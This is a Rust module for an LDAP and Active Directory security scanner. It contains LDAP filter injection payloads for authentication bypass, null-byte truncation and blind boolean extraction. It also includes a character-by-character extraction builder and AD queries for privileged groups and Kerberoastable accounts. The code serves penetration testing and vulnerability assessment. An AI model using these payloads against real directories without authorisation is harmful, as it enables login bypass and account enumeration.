use std::fmt;

/// LDAP filter injection payloads used to test for injection vulnerabilities
/// in LDAP-backed authentication and search endpoints.
pub const LDAP_INJECTION_PAYLOADS: &[LdapInjectionPayload] = &[
    LdapInjectionPayload {
        name: "wildcard_bypass",
        payload: "*",
        description: "Wildcard matches all entries — bypasses filters expecting specific values",
        category: InjectionCategory::FilterManipulation,
    },
    LdapInjectionPayload {
        name: "or_tautology",
        payload: ")(|(objectClass=*)",
        description: "Closes current filter, injects OR tautology matching all objectClasses",
        category: InjectionCategory::FilterManipulation,
    },
    LdapInjectionPayload {
        name: "and_tautology",
        payload: "*)(&",
        description: "Closes current filter with wildcard, opens dangling AND operator",
        category: InjectionCategory::FilterManipulation,
    },
    LdapInjectionPayload {
        name: "null_byte_bypass",
        payload: "admin\x00)(|(objectClass=*)",
        description: "Null byte truncation followed by OR tautology injection",
        category: InjectionCategory::NullByte,
    },
    LdapInjectionPayload {
        name: "nested_or_all_users",
        payload: "*)(|(uid=*)",
        description: "Wildcard close then OR injection enumerating all uid entries",
        category: InjectionCategory::UserEnumeration,
    },
    LdapInjectionPayload {
        name: "admin_or_bypass",
        payload: "admin)(|(password=*)",
        description: "Targets admin entry then injects OR to match any password field",
        category: InjectionCategory::AuthBypass,
    },
    LdapInjectionPayload {
        name: "comment_injection",
        payload: "admin)(%26)",
        description: "URL-encoded ampersand injection after closing the filter group",
        category: InjectionCategory::FilterManipulation,
    },
    LdapInjectionPayload {
        name: "double_close_or",
        payload: "))(|(objectClass=*",
        description: "Double close parenthesis to escape nested filters, then OR injection",
        category: InjectionCategory::FilterManipulation,
    },
    LdapInjectionPayload {
        name: "wildcard_uid_enum",
        payload: "a*",
        description: "Prefix wildcard for enumerating uids starting with 'a'",
        category: InjectionCategory::UserEnumeration,
    },
    LdapInjectionPayload {
        name: "blind_true_condition",
        payload: "*)(cn=*",
        description: "Boolean-true blind condition — cn=* matches all entries with a CN",
        category: InjectionCategory::BlindBoolean,
    },
    LdapInjectionPayload {
        name: "blind_false_condition",
        payload: "*)(cn=zzz_nonexistent_zzz",
        description: "Boolean-false blind condition — matches nothing, baseline for blind extraction",
        category: InjectionCategory::BlindBoolean,
    },
    LdapInjectionPayload {
        name: "group_membership_enum",
        payload: "*)(memberOf=*",
        description: "Injects memberOf filter to enumerate group membership attributes",
        category: InjectionCategory::GroupEnumeration,
    },
];

/// Boolean-based blind LDAP extraction charset and prefixes for iterative character extraction.
pub const BLIND_EXTRACTION_CHARSET: &str =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.@";

/// Common LDAP user attributes targeted during enumeration.
pub const USER_ENUMERATION_ATTRIBUTES: &[&str] = &[
    "uid",
    "cn",
    "sn",
    "givenName",
    "mail",
    "userPrincipalName",
    "sAMAccountName",
    "displayName",
    "telephoneNumber",
    "title",
    "department",
    "manager",
    "memberOf",
    "homeDirectory",
    "loginShell",
    "uidNumber",
];

/// Common LDAP objectClasses used in schema enumeration.
pub const SCHEMA_OBJECT_CLASSES: &[&str] = &[
    "top",
    "person",
    "organizationalPerson",
    "inetOrgPerson",
    "posixAccount",
    "shadowAccount",
    "groupOfNames",
    "groupOfUniqueNames",
    "organizationalUnit",
    "organization",
    "domain",
    "user",
    "group",
    "computer",
];

/// Active Directory-specific LDAP queries for domain enumeration.
pub const AD_ENUMERATION_QUERIES: &[AdEnumerationQuery] = &[
    AdEnumerationQuery {
        name: "domain_admins",
        filter: "(&(objectClass=group)(cn=Domain Admins))",
        description: "Locates the Domain Admins group to enumerate privileged users",
        target: AdTarget::PrivilegedGroup,
    },
    AdEnumerationQuery {
        name: "enterprise_admins",
        filter: "(&(objectClass=group)(cn=Enterprise Admins))",
        description: "Enterprise Admins — forest-wide administrative privileges",
        target: AdTarget::PrivilegedGroup,
    },
    AdEnumerationQuery {
        name: "schema_admins",
        filter: "(&(objectClass=group)(cn=Schema Admins))",
        description: "Schema Admins — can modify AD schema",
        target: AdTarget::PrivilegedGroup,
    },
    AdEnumerationQuery {
        name: "password_never_expires",
        filter: "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))",
        description: "Service accounts with DONT_EXPIRE_PASSWORD flag set (UAC bit 0x10000)",
        target: AdTarget::ServiceAccount,
    },
    AdEnumerationQuery {
        name: "disabled_accounts",
        filter: "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))",
        description: "Disabled accounts (UAC bit 0x2) — may reveal naming patterns",
        target: AdTarget::DisabledAccount,
    },
    AdEnumerationQuery {
        name: "password_policy",
        filter: "(objectClass=domainDNS)",
        description: "Domain root object — exposes lockoutThreshold, minPwdLength, maxPwdAge",
        target: AdTarget::PasswordPolicy,
    },
    AdEnumerationQuery {
        name: "trust_relationships",
        filter: "(objectClass=trustedDomain)",
        description: "Inter-domain and inter-forest trust relationships",
        target: AdTarget::TrustRelationship,
    },
    AdEnumerationQuery {
        name: "computer_accounts",
        filter: "(objectClass=computer)",
        description: "All domain-joined computer accounts — maps network topology",
        target: AdTarget::ComputerAccount,
    },
    AdEnumerationQuery {
        name: "gpo_objects",
        filter: "(objectClass=groupPolicyContainer)",
        description: "Group Policy Objects — applied security configurations",
        target: AdTarget::GroupPolicy,
    },
    AdEnumerationQuery {
        name: "kerberoastable",
        filter: "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))",
        description: "Accounts with SPNs set (Kerberoastable) excluding krbtgt",
        target: AdTarget::ServiceAccount,
    },
];

/// Group enumeration filters for extracting membership hierarchies.
pub const GROUP_ENUMERATION_FILTERS: &[&str] = &[
    "(objectClass=groupOfNames)",
    "(objectClass=groupOfUniqueNames)",
    "(objectClass=posixGroup)",
    "(objectClass=group)",
    "(&(objectClass=group)(groupType:1.2.840.113556.1.4.803:=2147483648))",
    "(&(objectClass=group)(member=*))",
];

/// Base DN patterns commonly used in LDAP directory structures.
pub const COMMON_BASE_DNS: &[&str] = &[
    "dc=example,dc=com",
    "dc=corp,dc=local",
    "dc=ad,dc=local",
    "dc=internal,dc=local",
    "dc=company,dc=local",
    "o=example",
    "ou=People,dc=example,dc=com",
    "ou=Users,dc=example,dc=com",
    "cn=Users,dc=example,dc=com",
];

/// Naming contexts commonly exposed via rootDSE queries on anonymous bind.
pub const ROOTDSE_ATTRIBUTES: &[&str] = &[
    "namingContexts",
    "defaultNamingContext",
    "schemaNamingContext",
    "configurationNamingContext",
    "rootDomainNamingContext",
    "supportedLDAPVersion",
    "supportedControl",
    "supportedExtension",
    "supportedSASLMechanisms",
    "dnsHostName",
    "serverName",
    "currentTime",
    "dsServiceName",
    "isGlobalCatalogReady",
    "forestFunctionality",
    "domainFunctionality",
    "domainControllerFunctionality",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum InjectionCategory {
    FilterManipulation,
    NullByte,
    UserEnumeration,
    AuthBypass,
    BlindBoolean,
    GroupEnumeration,
}

impl fmt::Display for InjectionCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::FilterManipulation => write!(f, "Filter Manipulation"),
            Self::NullByte => write!(f, "Null Byte"),
            Self::UserEnumeration => write!(f, "User Enumeration"),
            Self::AuthBypass => write!(f, "Auth Bypass"),
            Self::BlindBoolean => write!(f, "Blind Boolean"),
            Self::GroupEnumeration => write!(f, "Group Enumeration"),
        }
    }
}

#[derive(Debug, Clone, PartialEq)]
pub struct LdapInjectionPayload {
    pub name: &'static str,
    pub payload: &'static str,
    pub description: &'static str,
    pub category: InjectionCategory,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum AdTarget {
    PrivilegedGroup,
    ServiceAccount,
    DisabledAccount,
    PasswordPolicy,
    TrustRelationship,
    ComputerAccount,
    GroupPolicy,
}

impl fmt::Display for AdTarget {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::PrivilegedGroup => write!(f, "Privileged Group"),
            Self::ServiceAccount => write!(f, "Service Account"),
            Self::DisabledAccount => write!(f, "Disabled Account"),
            Self::PasswordPolicy => write!(f, "Password Policy"),
            Self::TrustRelationship => write!(f, "Trust Relationship"),
            Self::ComputerAccount => write!(f, "Computer Account"),
            Self::GroupPolicy => write!(f, "Group Policy"),
        }
    }
}

#[derive(Debug, Clone, PartialEq)]
pub struct AdEnumerationQuery {
    pub name: &'static str,
    pub filter: &'static str,
    pub description: &'static str,
    pub target: AdTarget,
}

#[derive(Debug, Clone, PartialEq)]
pub enum LdapBindType {
    Anonymous,
    NullCredentials,
    SimpleAuth { dn: String, password: String },
}

impl fmt::Display for LdapBindType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Anonymous => write!(f, "Anonymous Bind"),
            Self::NullCredentials => write!(f, "Null Credentials Bind"),
            Self::SimpleAuth { dn, .. } => write!(f, "Simple Auth ({})", dn),
        }
    }
}

#[derive(Debug, Clone, PartialEq)]
pub struct LdapBindResult {
    pub bind_type: LdapBindType,
    pub success: bool,
    pub server_message: Option<String>,
    pub naming_contexts: Vec<String>,
}

#[derive(Debug, Clone, PartialEq)]
pub struct SchemaEnumerationResult {
    pub object_classes: Vec<String>,
    pub attributes: Vec<String>,
    pub naming_contexts: Vec<String>,
    pub supported_controls: Vec<String>,
    pub ldap_versions: Vec<u8>,
}

#[derive(Debug, Clone, PartialEq)]
pub struct LdapUserEntry {
    pub dn: String,
    pub uid: Option<String>,
    pub cn: Option<String>,
    pub mail: Option<String>,
    pub groups: Vec<String>,
    pub extra_attributes: Vec<(String, String)>,
}

#[derive(Debug, Clone, PartialEq)]
pub struct LdapGroupEntry {
    pub dn: String,
    pub cn: String,
    pub members: Vec<String>,
    pub nested_groups: Vec<String>,
}

#[derive(Debug, Clone, PartialEq)]
pub struct BlindExtractionState {
    pub attribute: String,
    pub extracted: String,
    pub charset_remaining: Vec<char>,
    pub total_queries: usize,
    pub confirmed_length: Option<usize>,
}

impl BlindExtractionState {
    pub fn new(attribute: &str) -> Self {
        Self {
            attribute: attribute.to_string(),
            extracted: String::new(),
            charset_remaining: BLIND_EXTRACTION_CHARSET.chars().collect(),
            total_queries: 0,
            confirmed_length: None,
        }
    }

    pub fn advance(&mut self, ch: char) {
        self.extracted.push(ch);
        self.total_queries += 1;
        self.charset_remaining = BLIND_EXTRACTION_CHARSET.chars().collect();
    }

    pub fn record_miss(&mut self) {
        self.total_queries += 1;
    }

    pub fn is_complete(&self) -> bool {
        match self.confirmed_length {
            Some(len) => self.extracted.len() >= len,
            None => false,
        }
    }
}

#[derive(Debug, Clone, PartialEq)]
pub struct InjectionTestResult {
    pub payload: LdapInjectionPayload,
    pub original_response_size: Option<usize>,
    pub injected_response_size: Option<usize>,
    pub response_differs: bool,
    pub error_message: Option<String>,
    pub likely_vulnerable: bool,
}

#[derive(Debug, Clone, PartialEq)]
pub struct LdapEnumerationReport {
    pub target: String,
    pub port: u16,
    pub anonymous_bind: Option<LdapBindResult>,
    pub null_bind: Option<LdapBindResult>,
    pub schema: Option<SchemaEnumerationResult>,
    pub users: Vec<LdapUserEntry>,
    pub groups: Vec<LdapGroupEntry>,
    pub injection_results: Vec<InjectionTestResult>,
    pub ad_queries_attempted: Vec<AdEnumerationQuery>,
    pub blind_extraction_states: Vec<BlindExtractionState>,
    pub findings: Vec<LdapFinding>,
}

impl LdapEnumerationReport {
    pub fn new(target: &str, port: u16) -> Self {
        Self {
            target: target.to_string(),
            port,
            anonymous_bind: None,
            null_bind: None,
            schema: None,
            users: Vec::new(),
            groups: Vec::new(),
            injection_results: Vec::new(),
            ad_queries_attempted: Vec::new(),
            blind_extraction_states: Vec::new(),
            findings: Vec::new(),
        }
    }

    pub fn record_anonymous_bind(&mut self, result: LdapBindResult) {
        if result.success {
            self.findings.push(LdapFinding {
                severity: FindingSeverity::High,
                finding_type: LdapFindingType::AnonymousBindAllowed,
                detail: format!(
                    "Anonymous bind accepted — {} naming contexts exposed",
                    result.naming_contexts.len()
                ),
                evidence: result.naming_contexts.join(", "),
            });
        }
        self.anonymous_bind = Some(result);
    }

    pub fn record_null_bind(&mut self, result: LdapBindResult) {
        if result.success {
            self.findings.push(LdapFinding {
                severity: FindingSeverity::High,
                finding_type: LdapFindingType::NullBindAccepted,
                detail: "Null credentials bind accepted by server".to_string(),
                evidence: result
                    .server_message
                    .clone()
                    .unwrap_or_else(|| "No message".to_string()),
            });
        }
        self.null_bind = Some(result);
    }

    pub fn record_schema(&mut self, schema: SchemaEnumerationResult) {
        if !schema.object_classes.is_empty() || !schema.naming_contexts.is_empty() {
            self.findings.push(LdapFinding {
                severity: FindingSeverity::Medium,
                finding_type: LdapFindingType::SchemaExposed,
                detail: format!(
                    "Schema enumeration succeeded: {} objectClasses, {} naming contexts",
                    schema.object_classes.len(),
                    schema.naming_contexts.len()
                ),
                evidence: schema
                    .object_classes
                    .iter()
                    .take(5)
                    .cloned()
                    .collect::<Vec<_>>()
                    .join(", "),
            });
        }
        self.schema = Some(schema);
    }

    pub fn record_users(&mut self, users: Vec<LdapUserEntry>) {
        if !users.is_empty() {
            self.findings.push(LdapFinding {
                severity: FindingSeverity::High,
                finding_type: LdapFindingType::UserEnumerationSucceeded,
                detail: format!("{} user entries extracted via LDAP search", users.len()),
                evidence: users
                    .iter()
                    .take(3)
                    .map(|u| u.dn.clone())
                    .collect::<Vec<_>>()
                    .join("; "),
            });
        }
        self.users = users;
    }

    pub fn record_groups(&mut self, groups: Vec<LdapGroupEntry>) {
        if !groups.is_empty() {
            self.findings.push(LdapFinding {
                severity: FindingSeverity::Medium,
                finding_type: LdapFindingType::GroupEnumerationSucceeded,
                detail: format!(
                    "{} groups extracted, {} total member references",
                    groups.len(),
                    groups.iter().map(|g| g.members.len()).sum::<usize>()
                ),
                evidence: groups
                    .iter()
                    .take(3)
                    .map(|g| g.cn.clone())
                    .collect::<Vec<_>>()
                    .join("; "),
            });
        }
        self.groups = groups;
    }

    pub fn record_injection_result(&mut self, result: InjectionTestResult) {
        if result.likely_vulnerable {
            self.findings.push(LdapFinding {
                severity: FindingSeverity::Critical,
                finding_type: LdapFindingType::InjectionVulnerable,
                detail: format!(
                    "LDAP injection via '{}' ({}) — response size delta indicates filter manipulation",
                    result.payload.name, result.payload.category
                ),
                evidence: result.payload.payload.to_string(),
            });
        }
        self.injection_results.push(result);
    }

    pub fn record_ad_query(&mut self, query: AdEnumerationQuery) {
        self.ad_queries_attempted.push(query);
    }

    pub fn record_blind_state(&mut self, state: BlindExtractionState) {
        if !state.extracted.is_empty() {
            self.findings.push(LdapFinding {
                severity: FindingSeverity::Critical,
                finding_type: LdapFindingType::BlindExtractionSucceeded,
                detail: format!(
                    "Blind LDAP extraction recovered {} chars of '{}' attribute in {} queries",
                    state.extracted.len(),
                    state.attribute,
                    state.total_queries
                ),
                evidence: format!("Partial value: {}...", &state.extracted),
            });
        }
        self.blind_extraction_states.push(state);
    }

    pub fn service_account_findings(&self) -> Vec<&AdEnumerationQuery> {
        self.ad_queries_attempted
            .iter()
            .filter(|q| q.target == AdTarget::ServiceAccount)
            .collect()
    }

    pub fn critical_findings(&self) -> Vec<&LdapFinding> {
        self.findings
            .iter()
            .filter(|f| f.severity == FindingSeverity::Critical)
            .collect()
    }

    pub fn total_findings(&self) -> usize {
        self.findings.len()
    }
}

#[derive(Debug, Clone, PartialEq)]
pub struct LdapFinding {
    pub severity: FindingSeverity,
    pub finding_type: LdapFindingType,
    pub detail: String,
    pub evidence: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum FindingSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for FindingSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Info => write!(f, "Info"),
            Self::Low => write!(f, "Low"),
            Self::Medium => write!(f, "Medium"),
            Self::High => write!(f, "High"),
            Self::Critical => write!(f, "Critical"),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum LdapFindingType {
    AnonymousBindAllowed,
    NullBindAccepted,
    SchemaExposed,
    UserEnumerationSucceeded,
    GroupEnumerationSucceeded,
    InjectionVulnerable,
    BlindExtractionSucceeded,
    ServiceAccountDetected,
    PrivilegedGroupExposed,
}

impl fmt::Display for LdapFindingType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::AnonymousBindAllowed => write!(f, "Anonymous Bind Allowed"),
            Self::NullBindAccepted => write!(f, "Null Bind Accepted"),
            Self::SchemaExposed => write!(f, "Schema Exposed"),
            Self::UserEnumerationSucceeded => write!(f, "User Enumeration Succeeded"),
            Self::GroupEnumerationSucceeded => write!(f, "Group Enumeration Succeeded"),
            Self::InjectionVulnerable => write!(f, "LDAP Injection Vulnerable"),
            Self::BlindExtractionSucceeded => write!(f, "Blind Extraction Succeeded"),
            Self::ServiceAccountDetected => write!(f, "Service Account Detected"),
            Self::PrivilegedGroupExposed => write!(f, "Privileged Group Exposed"),
        }
    }
}

/// Constructs a blind LDAP injection payload that tests whether a given attribute
/// starts with the specified prefix. Used for character-by-character extraction.
pub fn build_blind_payload(attribute: &str, prefix: &str, next_char: char) -> String {
    format!("*)({}={}{}*", attribute, prefix, next_char)
}

/// Evaluates whether two response sizes differ enough to indicate a boolean
/// true/false split in blind LDAP injection. Uses a tolerance threshold.
pub fn blind_response_differs(baseline_size: usize, test_size: usize, tolerance: usize) -> bool {
    let diff = baseline_size.abs_diff(test_size);
    diff > tolerance
}

/// Generates all injection payloads for a given category.
pub fn payloads_for_category(category: InjectionCategory) -> Vec<&'static LdapInjectionPayload> {
    LDAP_INJECTION_PAYLOADS
        .iter()
        .filter(|p| p.category == category)
        .collect()
}

/// Returns AD enumeration queries targeting a specific AD object type.
pub fn ad_queries_for_target(target: AdTarget) -> Vec<&'static AdEnumerationQuery> {
    AD_ENUMERATION_QUERIES
        .iter()
        .filter(|q| q.target == target)
        .collect()
}

/// Builds a user enumeration LDAP filter from a list of target attributes.
/// Produces an OR filter: (|(uid=*)(cn=*)(mail=*)...)
pub fn build_user_enum_filter(attributes: &[&str]) -> String {
    if attributes.is_empty() {
        return "(objectClass=person)".to_string();
    }
    let clauses: Vec<String> = attributes.iter().map(|a| format!("({}=*)", a)).collect();
    if clauses.len() == 1 {
        return format!("(&(objectClass=person){})", clauses[0]);
    }
    format!("(&(objectClass=person)(|{}))", clauses.join(""))
}

/// Builds a group enumeration LDAP filter that searches across multiple
/// group objectClasses.
pub fn build_group_enum_filter() -> String {
    "(|(objectClass=groupOfNames)(objectClass=groupOfUniqueNames)(objectClass=posixGroup)(objectClass=group))".to_string()
}

/// Determines whether an LDAP injection test result indicates vulnerability
/// by comparing response sizes and checking for error-based info leaks.
pub fn evaluate_injection_result(
    original_size: Option<usize>,
    injected_size: Option<usize>,
    error_msg: Option<&str>,
    tolerance: usize,
) -> bool {
    if let Some(err) = error_msg {
        let leak_indicators = [
            "syntax error",
            "invalid filter",
            "bad search filter",
            "ldap_search",
            "javax.naming",
            "LDAPException",
            "filter error",
            "unbalanced",
        ];
        if leak_indicators
            .iter()
            .any(|ind| err.to_lowercase().contains(&ind.to_lowercase()))
        {
            return true;
        }
    }

    match (original_size, injected_size) {
        (Some(orig), Some(inj)) => blind_response_differs(orig, inj, tolerance),
        _ => false,
    }
}

/// Constructs a rootDSE query filter. The rootDSE is accessed by searching
/// base "" with scope BASE and filter (objectClass=*).
pub fn rootdse_filter() -> &'static str {
    "(objectClass=*)"
}

/// Returns the standard set of rootDSE attributes to request.
pub fn rootdse_requested_attributes() -> &'static [&'static str] {
    ROOTDSE_ATTRIBUTES
}

/// Generates nested group resolution filters for Active Directory.
/// Uses the LDAP_MATCHING_RULE_IN_CHAIN OID (1.2.840.113556.1.4.1941)
/// for recursive group membership expansion.
pub fn build_nested_group_filter(group_dn: &str) -> String {
    format!("(memberOf:1.2.840.113556.1.4.1941:={})", group_dn)
}

/// Constructs an LDAP search filter for detecting service accounts with
/// non-expiring passwords (userAccountControl DONT_EXPIRE_PASSWORD bit).
pub fn build_service_account_filter() -> &'static str {
    "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"
}

/// Builds a password policy query. AD stores password policy on the domain root
/// object. The attributes of interest are:
/// minPwdLength, maxPwdAge, minPwdAge, lockoutThreshold, lockoutDuration, pwdHistoryLength.
pub fn password_policy_attributes() -> &'static [&'static str] {
    &[
        "minPwdLength",
        "maxPwdAge",
        "minPwdAge",
        "lockoutThreshold",
        "lockoutDuration",
        "lockoutObservationWindow",
        "pwdHistoryLength",
    ]
}

/// Generates a Kerberoasting detection filter — finds user accounts with
/// servicePrincipalName set (excluding krbtgt).
pub fn build_kerberoastable_filter() -> &'static str {
    "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))"
}

/// Computes a risk score for the overall LDAP enumeration report.
/// Weights: Critical=40, High=20, Medium=10, Low=5, Info=1.
pub fn compute_risk_score(report: &LdapEnumerationReport) -> u32 {
    report
        .findings
        .iter()
        .map(|f| match f.severity {
            FindingSeverity::Critical => 40,
            FindingSeverity::High => 20,
            FindingSeverity::Medium => 10,
            FindingSeverity::Low => 5,
            FindingSeverity::Info => 1,
        })
        .sum()
}
